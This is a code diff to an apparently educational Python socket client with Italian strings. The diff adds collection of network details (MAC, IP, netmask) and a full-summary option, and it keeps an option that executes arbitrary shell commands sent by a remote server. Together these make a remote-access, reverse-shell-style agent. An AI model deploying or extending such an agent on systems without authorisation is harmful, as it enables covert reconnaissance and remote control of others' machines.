@@ -1,5 +1,6 @@
 from socket import *
 from datetime import datetime
+from uuid import getnode as get_mac
 import os, platform, subprocess, re, time
 import psutil #verificare funzionamento su linux e mac
 
@@ -109,7 +110,7 @@ def getBootTimeInfo():
     ore = boot_time.hour
     minuti = boot_time.minute
     secondi = boot_time.second
-    boot_time_info = f"Il sistema e\' attivo dal giorno {giorno}/{mese}/{anno} dalle ore {ore}:{minuti}:{secondi}"
+    boot_time_info = f"Il sistema e\' attivo dal giorno {giorno}/{mese}/{anno} dalle ore {ore}:{minuti}:{secondi}\n"
     return intestazione+boot_time_info
 
 def getMemoryInfo():
@@ -160,12 +161,27 @@ def getDiskInfo():
         informazioni_disco = intestazione+sub_intestazione_1+info_partizioni+sub_intestazione_2+dettagli_partizioni
     return informazioni_disco
 
+def getNetworkInfo():
+    intestazione = "\n=== INFORMAZIONI SULLA SCHEDA DI RETE E INTERFACCE DI RETE === \n"
+    info_rete = psutil.net_if_addrs()
+    valore_indirizzo_mac = get_mac()
+    indirizzo_mac = '{0:016x}'.format(valore_indirizzo_mac)
+    indirizzo_mac = ':'.join(re.findall(r'\w\w', indirizzo_mac)).upper()
+    dettagli_rete = "Indirizzo MAC scheda di rete: " + indirizzo_mac + "\n\n"
+
+    for nome_interfaccia_rete, indirizzi_interfaccia_rete in info_rete.items():
+        for indirizzo_rete in indirizzi_interfaccia_rete:
+            if (str(indirizzo_rete.family) == 'AddressFamily.AF_INET'):
+                dettagli_rete = dettagli_rete + \
+                                "Nome interfaccia di rete: " + nome_interfaccia_rete + "\n" + \
+                                "Indirizzo IP: " + str(indirizzo_rete.address) + "\n" + \
+                                "Network mask: " + str(indirizzo_rete.netmask) + "\n" + \
+                                "Broadcast: " + str(indirizzo_rete.broadcast) + "\n\n"
+    return intestazione+dettagli_rete
+
 def executeShellCommand(cmd):
     #Prendiamo ogni componente del comando per distinguere tra cd e altri comandi
     global cwd
-    carattere_separatore = '/'
-    if (platform.system() == "Windows"):
-        carattere_separatore = '\\'
     split_cmd = cmd.split()
     if split_cmd[0] == "cd":
         #Tentativo per cambiamento directory assoluta
@@ -227,12 +243,17 @@ while True:
         invia_messaggio(getMemoryInfo())
     elif comando == "5":
         invia_messaggio(getDiskInfo())
-    elif comando.split('<sep>')[0] == "6":
+    elif comando == "6":
+        invia_messaggio(getNetworkInfo())
+    elif comando.split('<sep>')[0] == "7":
         executeShellCommand(comando.split('<sep>')[1])
+    elif comando == "8":
+        riepilogo_informazioni = str(getSystemInfo()+getCPUInfo()+getBootTimeInfo()+getMemoryInfo()+getDiskInfo()+getNetworkInfo())
+        invia_messaggio(riepilogo_informazioni)
     elif comando == "0":
         break
     else:
-        print("errore comando")
+        invia_messaggio("Errore comando")
 
 print("Fine")
 clientSocket.close()
